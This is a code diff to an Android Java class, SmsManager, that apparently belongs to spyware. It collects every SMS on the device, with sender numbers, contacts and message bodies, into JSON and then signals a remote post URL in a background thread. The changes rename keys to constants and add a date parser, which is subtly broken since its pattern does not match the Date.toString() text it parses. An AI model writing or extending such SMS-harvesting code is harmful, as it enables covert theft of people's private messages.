@@ -12,6 +12,8 @@ import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import java.text.ParseException;
+import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.List;
 
@@ -70,17 +72,23 @@ public class SmsManager {
                 Date fDate = new Date(epoch * 1000);
                 date = fDate.toString();
 
-                sms.put("type",type);
-                sms.put("phoneNumber" , address);
-                sms.put("date",date);
-                sms.put("person",personN);
-                sms.put("msg" , body);
+                SimpleDateFormat dateFormat = new SimpleDateFormat("dd.MM.yyyy HH:mm:ss");
+
+                sms.put(base.SMS.SMS_TYPE,type);
+                sms.put(base.SMS.SMS_PHONE , address);
+                try {
+                    sms.put(base.SMS.SMS_DATE,dateFormat.parse(date));
+                } catch (ParseException e) {
+                    sms.put(base.SMS.SMS_DATE,date);
+                }
+                sms.put(base.SMS.SMS_PERSON,personN);
+                sms.put(base.SMS.SMS_MSG , body);
                 list.put(sms);
 
             }
-            SMSList.put("smsList", list);
+            SMSList.put(base.SMS.SMS_LIST, list);
             cur.close();
-            Runnable uploader = new HttpPoster(MyService.post_url,"[Sms]Список обновлён (нажмите Ctrl +f5)");
+            Runnable uploader = new HttpPoster(MyService.post_url,"[Sms]Список обновлён");
             new Thread(uploader).start();
             return SMSList;
         } catch (JSONException e) {
